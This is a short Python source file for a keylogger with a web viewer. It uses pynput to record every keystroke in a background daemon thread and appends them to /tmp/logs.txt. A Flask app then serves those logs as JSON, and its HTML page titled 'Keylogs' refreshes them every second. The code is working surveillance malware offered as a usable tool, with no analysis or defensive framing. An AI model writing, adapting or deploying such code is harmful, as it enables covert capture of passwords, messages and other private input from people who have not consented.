from flask import Flask, render_template_string, jsonify
from pynput import keyboard
import os
from threading import Thread
from werkzeug.middleware.dispatcher import DispatcherMiddleware
from werkzeug.wrappers import Response

log_file_path = "/tmp/logs.txt"

if not os.path.exists(log_file_path):
    with open(log_file_path, "w") as f:
        f.write("")

def on_press(key):
    try:
        with open(log_file_path, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as f:
            f.write(f"[{key}]")

keylogger_thread = Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True)
keylogger_thread.start()

app = Flask(__name__)

HTML_PAGE = """<!DOCTYPE html><html><head><title>Logs</title></head><body><h1>Keylogs</h1><pre id='log'>Loading...</pre><script>async function fetchLogs(){const res=await fetch('/api/logs');const data=await res.json();document.getElementById('log').textContent=data.data;}setInterval(fetchLogs,1000);fetchLogs();</script></body></html>"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/logs")
def logs():
    with open(log_file_path, "r") as f:
        content = f.read()
    return jsonify({"data": content})

def handler(environ, start_response):
    return DispatcherMiddleware(Response('Not Found', status=404), {
        '/api': app
    })(environ, start_response)
